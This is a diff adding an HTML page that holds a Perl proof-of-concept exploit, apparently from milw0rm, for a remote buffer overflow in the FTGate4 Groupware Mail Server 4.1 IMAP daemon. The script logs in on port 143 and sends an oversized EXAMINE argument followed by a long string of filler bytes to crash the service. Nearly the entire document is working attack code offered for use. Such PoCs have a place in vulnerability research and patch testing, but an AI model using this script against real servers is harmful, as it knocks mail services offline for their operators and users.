@@ -1,0 +1,44 @@
+<html>
+<head>
+<title>FTGate4 Groupware Mail Server 4.1 (imapd) Remote Buffer Overflow PoC</title>
+<pre>
+#!/usr/bin/perl
+
+use IO::Socket;
+
+print &quot;\nFTGate Imapd BufferOverrun\nLuca Ercoli io\@lucaercoli.it\n&quot;;
+print &quot;http://www.lucaercoli.it\n\n\n&quot;;
+
+$host = &quot;localhost&quot;;
+
+$remote = IO::Socket::INET-&gt;new ( Proto =&gt; &quot;tcp&quot;,
+PeerAddr =&gt; $host,
+PeerPort =&gt; &quot;143&quot;,
+);
+
+unless ($remote) { die &quot;Can't connect to $host&quot; }
+
+print &quot;[!] Connected\n&quot;;
+print &quot;[?] Exploiting...\n&quot;;
+
+sleep(1);
+
+my $imapd = join (&quot;&quot;, &quot;1 login user pass&quot;, &quot;\r\n&quot;);
+
+print $remote $imapd;
+
+sleep(1);
+my $imapd = join (&quot;&quot;, &quot;1 EXAMINE &quot;, &quot;B&quot;x(224), &quot;\r\n&quot;);
+print $remote $imapd;
+sleep(1);
+my $imapd = join (&quot;&quot;,&quot;C&quot;x(11305), &quot;\r\n&quot;);
+print $remote $imapd;
+
+print &quot;\n[!] Done\n\n\n&quot;;
+
+close $remote;
+
+# milw0rm.com [2005-11-16]
+</pre>
+</html>
+
